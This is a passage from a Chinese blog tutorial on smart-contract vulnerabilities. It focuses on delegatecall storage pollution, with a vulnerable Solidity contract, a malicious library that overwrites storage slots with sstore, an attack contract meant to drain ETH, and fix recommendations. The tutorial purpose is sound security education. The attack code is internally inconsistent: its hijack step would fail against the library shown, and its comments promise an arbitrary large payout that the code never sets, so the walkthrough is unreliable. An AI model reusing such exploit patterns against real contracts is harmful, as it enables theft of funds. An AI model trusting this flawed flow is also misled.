<li><strong>引入内部账本（内部记账）</strong>：对每个参与者维护 <code>mapping(address =&gt; uint256) deposits</code>，并基于内部记账判断资格与分配奖励，而非全局合约余额。</li>
<li><strong>对领奖逻辑增加资格校验</strong>：例如只有实际有贡献（<code>deposits[msg.sender] &gt; 0</code>）或在白名单内的参与者才可 <code>claimReward</code>。</li>
<li><strong>使用 Pull payments 模式</strong>：记录应得金额，受益人主动提取（<code>withdraw</code>），避免一次性把合约全额发出给任意调用者。</li>
<li><strong>对不可预见到的强制转账保持防御性设计</strong>：假定 <code>address(this).balance</code> 可能随时被外部强制改变，业务逻辑应能容忍或检测这种情况（例如不根据全局余额做关键判断）。</li>
<li><strong>日志与监控</strong>：对关键状态（如达到里程碑）做审计日志与链上告警，便于人工判断是否为异常触发。</li>
</ul>
<h1 id="Delegatecall"><a href="#Delegatecall" class="headerlink" title="Delegatecall"></a>Delegatecall</h1><p><strong>主要导致存储污染</strong></p>
<p><strong>存储污染</strong>指：一个合约的状态变量（storage slot）被意外或恶意修改，导致合约逻辑异常或关键数据被篡改。</p>
<p><strong>典型场景</strong>：使用 <code>delegatecall</code> 调用外部库合约时，被调用合约的代码在调用合约上下文中执行，任何对 <code>storage</code> 的写入都会影响调用合约自身的状态。</p>
<h2 id="1-Vulnerable-FibonacciBalance（存在-delegatecall-导致的存储污染问题）"><a href="#1-Vulnerable-FibonacciBalance（存在-delegatecall-导致的存储污染问题）" class="headerlink" title="1. Vulnerable: FibonacciBalance（存在 delegatecall 导致的存储污染问题）"></a>1. Vulnerable: <code>FibonacciBalance</code>（存在 <code>delegatecall</code> 导致的存储污染问题）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract FibonacciBalance &#123;</span><br><span class="line">    // storage layout (slots)</span><br><span class="line">    address public fibonacciLibrary;      // slot 0</span><br><span class="line">    uint256 public calculatedFibNumber;   // slot 1</span><br><span class="line">    uint256 public start = 3;             // slot 2</span><br><span class="line">    uint256 public withdrawalCounter;     // slot 3</span><br><span class="line"></span><br><span class="line">    bytes4 constant fbSig = bytes4(keccak256(&quot;setFibonacci(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">    constructor(address _fibonacciLibrary) payable &#123;</span><br><span class="line">        fibonacciLibrary = _fibonacciLibrary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 每次 withdraw 会先增加 counter，然后通过 delegatecall 调用 library 的 setFibonacci</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        withdrawalCounter += 1;</span><br><span class="line">        (bool ok, ) = fibonacciLibrary.delegatecall(abi.encodeWithSelector(fbSig, withdrawalCounter));</span><br><span class="line">        require(ok, &quot;delegatecall failed&quot;);</span><br><span class="line"></span><br><span class="line">        // 按计算的 Fib 值发 ETH（简化示例）</span><br><span class="line">        payable(msg.sender).transfer(calculatedFibNumber * 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 将任意 calldata 转发给 library（危险：任何外部输入都会以 delegatecall 在本合约上下文执行）</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        (bool ok, ) = fibonacciLibrary.delegatecall(msg.data);</span><br><span class="line">        require(ok, &quot;fallback delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-Intended-library-FibonacciLib（正常实现，按自身-storage-布局写入）"><a href="#2-Intended-library-FibonacciLib（正常实现，按自身-storage-布局写入）" class="headerlink" title="2. Intended library: FibonacciLib（正常实现，按自身 storage 布局写入）"></a>2. Intended library: <code>FibonacciLib</code>（正常实现，按自身 storage 布局写入）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract FibonacciLib &#123;</span><br><span class="line">    // library 自己的 storage 布局（在 delegatecall 时会映射到调用者合约的 storage）</span><br><span class="line">    uint256 public start;                 // slot 0 (when used via delegatecall it maps to caller.slot0)</span><br><span class="line">    uint256 public calculatedFibNumber;   // slot 1</span><br><span class="line"></span><br><span class="line">    function setStart(uint256 _start) public &#123;</span><br><span class="line">        start = _start;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setFibonacci(uint256 n) public &#123;</span><br><span class="line">        calculatedFibNumber = hbonacci(n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hbonacci(uint256 n) internal view returns (uint256) &#123;</span><br><span class="line">        if (n == 0) return start;</span><br><span class="line">        if (n == 1) return start + 1;</span><br><span class="line">        // 简化：递归实现可能会耗 gas，此处仅示例</span><br><span class="line">        uint256 a = start;</span><br><span class="line">        uint256 b = start + 1;</span><br><span class="line">        for (uint256 i = 2; i &lt;= n; i++) &#123;</span><br><span class="line">            uint256 c = a + b;</span><br><span class="line">            a = b;</span><br><span class="line">            b = c;</span><br><span class="line">        &#125;</span><br><span class="line">        return b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="3-恶意库：MaliciousLib（通过写入特定-storage-slot-来篡改调用者合约的关键变量）"><a href="#3-恶意库：MaliciousLib（通过写入特定-storage-slot-来篡改调用者合约的关键变量）" class="headerlink" title="3. 恶意库：MaliciousLib（通过写入特定 storage slot 来篡改调用者合约的关键变量）"></a>3. 恶意库：<code>MaliciousLib</code>（通过写入特定 storage slot 来篡改调用者合约的关键变量）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MaliciousLib &#123;</span><br><span class="line">    // 注意：此合约的 storage 布局与 FibonacciBalance 不同，</span><br><span class="line">    // 当通过 delegatecall 在目标合约上下文执行时，赋值会写到目标合约的 storage slot。</span><br><span class="line">    // 例如：下面的函数故意写入 slot 0，使调用者的 fibonacciLibrary 被替换为攻击者指定的地址。</span><br><span class="line"></span><br><span class="line">    // 将 slot 0 覆写为传入的地址（通过低级写 storage 实现）</span><br><span class="line">    function hijackLibrary(address newLib) public &#123;</span><br><span class="line">        // 在 delegatecall 上下文中，这会写入调用者合约的 slot 0</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(0, newLib)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 也提供一个 setFibonacci 用于示例：直接设置 slot 1（调用者的 calculatedFibNumber）</span><br><span class="line">    function setFibonacci(uint256 v) public &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(1, v)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="4-攻击合约（示例攻击流程）"><a href="#4-攻击合约（示例攻击流程）" class="headerlink" title="4. 攻击合约（示例攻击流程）"></a>4. 攻击合约（示例攻击流程）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IFibonacciBalance &#123;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public attacker;</span><br><span class="line">    address public maliciousLib;</span><br><span class="line"></span><br><span class="line">    constructor(address _maliciousLib) &#123;</span><br><span class="line">        attacker = msg.sender;</span><br><span class="line">        maliciousLib = _maliciousLib;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 步骤示例：</span><br><span class="line">    // 1) 先把目标合约的 fibonacciLibrary 指向 maliciousLib（通过调用 fallback 转发一个对 maliciousLib.hijackLibrary 的 delegatecall）</span><br><span class="line">    // 2) 再触发 withdraw，maliciousLib 的 setFibonacci 会把 calculatedFibNumber 设置为任意大值，从而 withdraw 时转出大量 ETH（演示）</span><br><span class="line">    function attackHijack(address target) external &#123;</span><br><span class="line">        // 1) 构造调用数据：hijackLibrary(address)</span><br><span class="line">        bytes memory data = abi.encodeWithSignature(&quot;hijackLibrary(address)&quot;, maliciousLib);</span><br><span class="line">        // 通过向 target 发送这笔交易，让 target.fallback() 执行 delegatecall(msg.data)</span><br><span class="line">        // 在实际环境中，直接调用 target 的 fallback 即可（这里用 low-level call 模拟）</span><br><span class="line">        (bool ok, ) = target.call(data);</span><br><span class="line">        require(ok, &quot;hijack failed&quot;);</span><br><span class="line"></span><br><span class="line">        // 2) 现在调用 maliciousLib.setFibonacci(v) via target.withdraw() 的流程：</span><br><span class="line">        // 我们先把 maliciousLib 的 setFibonacci 会写入 slot 1（calculatedFibNumber）</span><br><span class="line">        // 直接触发 withdraw（withdraw 会 delegatecall setFibonacci with withdrawalCounter 作为参数）</span><br><span class="line">        IFibonacciBalance(target).withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-漏洞要点"><a href="#5-漏洞要点" class="headerlink" title="5. 漏洞要点"></a>5. 漏洞要点</h2><ul>
<li><code>delegatecall</code> 会在调用者（caller）的上下文中执行被调合约（library）的代码：<strong>被调合约对 state 的写入会影响调用合约的 storage slots</strong>。</li>
<li>若调用合约允许任意 calldata 被转发到 <code>delegatecall</code>（如 <code>fallback()</code> 直接 <code>delegatecall(msg.data)</code>），攻击者可以构造 calldata 来执行恶意 library 的方法，从而修改调用合约的关键 storage（如 <code>fibonacciLibrary</code> 或 <code>calculatedFibNumber</code>）。</li>
<li>由于 storage slot 的映射关系，<strong>库合约与调用合约必须严格对齐 storage 布局</strong>，否则将出现存储污染或被滥用的风险。</li>
</ul>
<hr>
<h2 id="6-修复建议"><a href="#6-修复建议" class="headerlink" title="6. 修复建议"></a>6. 修复建议</h2><ul>
<li><strong>不要把不受信任的地址设为可 delegatecall 的目标</strong>；如果必须使用 library，确保其来源可信且 storage 布局一致且不可更改。</li>
<li><strong>禁止将外部任意 calldata 直接转发给 library</strong>（不要实现 <code>fallback()</code> 中无校验地 <code>delegatecall(msg.data)</code>）。</li>
<li><strong>将 library 地址设为不可变（<code>immutable</code>&#x2F;<code>constant</code>）或只有 owner 可变</strong>，并对修改操作加严格权限和审计。</li>
<li><strong>对关键 storage 的写入加入额外校验</strong>（例如检查写入前后值的合理性或使用 access control）。</li>
<li><strong>尽量使用 <code>delegatecall</code> 的替代方案</strong>（如 <code>library</code> 的 internal&#x2F;linked library 或明确的 proxy 模式并做好初始化&#x2F;检查）。</li>
</ul>
<h1 id="默认的可见性"><a href="#默认的可见性" class="headerlink" title="默认的可见性"></a>默认的可见性</h1><p>这个很简单，就是可见性设置错了让黑客有可乘之机。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://kizzy899.github.io">kizy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://kizzy899.github.io/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%931/">https://kizzy899.github.io/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%931/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://kizzy899.github.io" target="_blank">EIGHTJIU</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/">合约审计</a></div><div class="post-share"><div class="social-share" data-image="/aaaset/cover_8.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%932/" title="基础漏洞总结2"><img class="cover" src="/aaaset/cover_9.jpg" onerror="onerror=null;src='/img/404page.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">基础漏洞总结2</div></div><div class="info-2"><div class="info-item-1">随机错觉(Entropy lllusion)随机错觉，也称为熵错觉，指的是开发者错误地认为在区块链上可以轻易地获得安全、不可预测的随机数。 简单来说，这是一种“我以为它是随机的，但实际上并非如此”的认知错误。 示例一个私有视图函数，用于根据一定的随机性条件判断是否执行空投。 123456789101112131415function airdrop() private view returns(bool)&#123;    uint256 seed = uint256(keccak256(abi.encodePacked(        (block.timestamp).add        (block.difficulty).add        ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add        (block.gaslimit).add        ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).a...</div></div></div></a><a class="pagination-related" href="/2025/10/10/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/" title="关于Git 子模块（子文档）"><img class="cover" src="/aaaset/cover_18.jpg" onerror="onerror=null;src='/img/404page.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">关于Git 子模块（子文档）</div></div><div class="info-2"><div class="info-item-1">问题发现&amp;解决什么是子模块（子文档） 定义：Git 子模块（submodule）是一个嵌套在父仓库中的独立 Git 仓库。 作用：允许你在一个 Git 仓库中引用另一个仓库，并保持独立版本控制。 特点： 有自己的 .git 目录或由父仓库 .gitmodules 管理。 GitHub 上显示为 箭头文件夹，点击会跳转到子模块的远程仓库。 本地未初始化或更新时，会出现 in unpopulated submodule 报错。     如何发现文件夹被上传成子模块  GitHub 文件浏览器：  文件夹前有 箭头标记。 点击会跳到子模块对应的远程仓库，而不是显示普通文件列表。   本地操作：  执行 git status 或 git submodule status 可能显示子模块信息。  对未初始化的子模块操作文件会报错，例如： 1in unpopulated submodule     为什么文件夹会被识别为子模块 误操作添加子模块： 1git submodule add &lt;repo_url&gt; 子文件夹名   Git 会记录子模块信息在 .gitmodules...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/01/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A2%98%E8%A7%A3/" title="记一次题解"><img class="cover" src="/cover/cover9.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-15</div><div class="info-item-2">记一次题解</div></div><div class="info-2"><div class="info-item-1">第一题有无除了直接点击deploy外的其他方法部署一个合约 第一题题解create和create2 第二题简单说说怎样优化一下这个私人金库合约 1234567891011121314151617181920212223242526// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;    address public owner;    receive() external payable &#123;        // just a receive function    &#125;    function deposit() external view payable &#123;        require(msg.value &gt; 0, &quot;Must send some ether&quot;);        // code? what code?    &#125;    function getBalance() internal view retur...</div></div></div></a><a class="pagination-related" href="/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%933/" title="基础漏洞总结3"><img class="cover" src="/aaaset/cover_10.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-13</div><div class="info-item-2">基础漏洞总结3</div></div><div class="info-2"><div class="info-item-1">拒绝服务拒绝服务指的是攻击者通过某种方式阻止合约正常执行其预期功能，使得合约无法继续服务合法用户。 简单来说，这是一种”我让你无法正常工作”的攻击方式。在智能合约中，DoS攻击通常通过操纵合约状态或利用执行限制来实现。 示例一个代币分发合约，负责收集投资并向投资者分发回报： 123456789101112131415161718192021contract DistributeTokens &#123;    address public owner; // gets set somewhere    address[] investors; // array of investors    uint[] investorBalances; // the amount investor gets    bool public isFinalized = false;        // ...        function invest() public payable &#123;        investors.push(msg.sender);        inves...</div></div></div></a><a class="pagination-related" href="/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%932/" title="基础漏洞总结2"><img class="cover" src="/aaaset/cover_9.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-13</div><div class="info-item-2">基础漏洞总结2</div></div><div class="info-2"><div class="info-item-1">随机错觉(Entropy lllusion)随机错觉，也称为熵错觉，指的是开发者错误地认为在区块链上可以轻易地获得安全、不可预测的随机数。 简单来说，这是一种“我以为它是随机的，但实际上并非如此”的认知错误。 示例一个私有视图函数，用于根据一定的随机性条件判断是否执行空投。 123456789101112131415function airdrop() private view returns(bool)&#123;    uint256 seed = uint256(keccak256(abi.encodePacked(        (block.timestamp).add        (block.difficulty).add        ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add        (block.gaslimit).add        ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).a...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/aaaset/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">kizy</div><div class="author-info-description">rainbow</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/kizzy899"><i class="fab fa-github"></i><span>my github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kizzy899" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Sampre avanti</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%87%8D%E5%85%A5re-entrancy"><span class="toc-number">1.</span> <span class="toc-text">重入re-entrancy</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.1.</span> <span class="toc-text">示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E7%A1%AE%E7%9A%84%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">正确的修复方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%BD%A0%E7%9A%84%E5%90%88%E7%BA%A6%E6%98%AF%E5%90%A6%E6%98%93%E8%A2%AB%E9%87%8D%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">如何判断你的合约是否易被重入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ATN%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">ATN攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ERC223"><span class="toc-number">2.1.</span> <span class="toc-text">ERC223</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-ERC20-%E4%B8%80%E6%AC%A1%E8%BD%AC%E8%B4%A6%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%A2%AB%E8%B0%83%E7%94%A8%E4%B8%A4%E6%AC%A1%EF%BC%8C%E8%80%8C-ERC223-%E5%8F%AA%E9%9C%80%E8%A6%81%E4%B8%80%E6%AC%A1%EF%BC%9F"><span class="toc-number">2.1.1.</span> <span class="toc-text">为什么 ERC20 一次转账可能会被调用两次，而 ERC223 只需要一次？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-ERC20-%E7%9A%84%E7%BC%BA%E9%99%B7"><span class="toc-number">2.1.2.</span> <span class="toc-text">🔹 ERC20 的缺陷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-ERC223-%E7%9A%84%E6%94%B9%E8%BF%9B"><span class="toc-number">2.1.3.</span> <span class="toc-text">🔹 ERC223 的改进</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DS-Auth%E5%BA%93"><span class="toc-number">2.2.</span> <span class="toc-text">DS-Auth库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-DS-Auth-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">1) DS-Auth 是什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-msg-sig-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.2.0.2.</span> <span class="toc-text">2) msg.sig 是什么</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ERC223-%E7%9A%84%E5%9B%9E%E8%B0%83%E6%9C%BA%E5%88%B6%E4%B8%BA%E4%BD%95%E5%B8%A6%E6%9D%A5%E9%A3%8E%E9%99%A9"><span class="toc-number">2.2.1.</span> <span class="toc-text">ERC223 的回调机制为何带来风险</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-number">2.2.2.</span> <span class="toc-text">攻击原理概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%EF%BC%88%E6%8A%BD%E8%B1%A1%EF%BC%89%E7%A4%BA%E4%BE%8B%E6%B5%81%E7%A8%8B"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">一个简单（抽象）示例流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E7%B1%BB%E6%94%BB%E5%87%BB%E5%AE%B9%E6%98%93%E8%A2%AB%E5%BF%BD%E8%A7%86-%E6%88%90%E5%8A%9F%E7%8E%87%E9%AB%98"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">为什么这类攻击容易被忽视 &#x2F; 成功率高</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%AE%9E%E8%B7%B5%E5%BB%BA%E8%AE%AE"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">防御与实践建议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ATN-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">ATN 攻击流程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%97%E6%9C%AF%E6%BA%A2%E5%87%BA-under-flows"><span class="toc-number">3.</span> <span class="toc-text">算术溢出(under flows)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">3.1.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">修复方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B-%E5%90%88%E7%BA%A6PolyAi-AI"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞实例:合约PolyAi(AI)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%9C%9C%E7%BD%90%E5%90%88%E7%BA%A6"><span class="toc-number">4.</span> <span class="toc-text">蜜罐合约</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%B8%80"><span class="toc-number">4.1.</span> <span class="toc-text">合约一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.1.</span> <span class="toc-text">为什么会攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%BA%8C"><span class="toc-number">4.2.</span> <span class="toc-text">合约二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%B8%89"><span class="toc-number">4.3.</span> <span class="toc-text">合约三</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Solidity-%E5%90%88%E7%BA%A6%E5%AD%98%E5%82%A8%E6%A7%BD%E8%A7%84%E5%88%99"><span class="toc-number">4.3.1.</span> <span class="toc-text">1. Solidity 合约存储槽规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E5%AD%98%E5%82%A8%E6%A7%BD%E7%9A%84%E5%80%BC"><span class="toc-number">4.3.2.</span> <span class="toc-text">2. 获取存储槽的值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%88ethers-js%EF%BC%89"><span class="toc-number">4.3.3.</span> <span class="toc-text">示例（ethers.js）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%90%86%E8%AE%BA%E6%8E%A8%E7%AE%97"><span class="toc-number">4.3.4.</span> <span class="toc-text">3. 